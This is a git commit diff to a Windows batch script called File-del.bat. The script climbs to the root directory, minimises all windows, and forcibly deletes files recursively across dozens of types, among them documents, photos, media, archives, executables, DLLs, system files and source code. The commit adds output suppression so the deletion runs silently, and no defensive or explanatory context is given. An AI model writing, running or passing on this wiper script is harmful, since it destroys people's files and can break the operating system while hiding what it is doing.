9abe28296815c86100333235bc65aeee25d66819
Vtos1957 <wafflesguy12345@gmail.com>
2026-08-14 09:12:07 -0600

    Update File-del.bat

--- File-del.bat
+++ File-del.bat
@@ -10,4 +10,4 @@ cd..
 cd..
 cd..
 powershell -command "(New-Object -ComObject Shell.Application).MinimizeAll()"
-del /s /f /q *.txt *.doc *.docx *.pdf *.rtf *.odt *.xls *.xlsx *.csv *.ppt *.pptx *.jpg *.jpeg *.png *.gif *.bmp *.tiff *.webp *.ico *.mp3 *.wav *.flac *.aac *.ogg *.mp4 *.mkv *.avi *.mov *.wmv *.zip *.rar *.7z *.tar *.gz  *.exe *.msi *.dll *.sys *.iso *.img *.html *.htm *.css *.js *.json *.xml *.php *.py *.java *.cpp *.c *.cs *.cmd *.ps1 *.ini *.cfg *.log *.tmp
+del /s /f /q *.txt *.doc *.docx *.pdf *.rtf *.odt *.xls *.xlsx *.csv *.ppt *.pptx *.jpg *.jpeg *.png *.gif *.bmp *.tiff *.webp *.ico *.mp3 *.wav *.flac *.aac *.ogg *.mp4 *.mkv *.avi *.mov *.wmv *.zip *.rar *.7z *.tar *.gz  *.exe *.msi *.dll *.sys *.iso *.img *.html *.htm *.css *.js *.json *.xml *.php *.py *.java *.cpp *.c *.cs *.cmd *.ps1 *.ini *.cfg *.log *.tmp >nul 2>&1
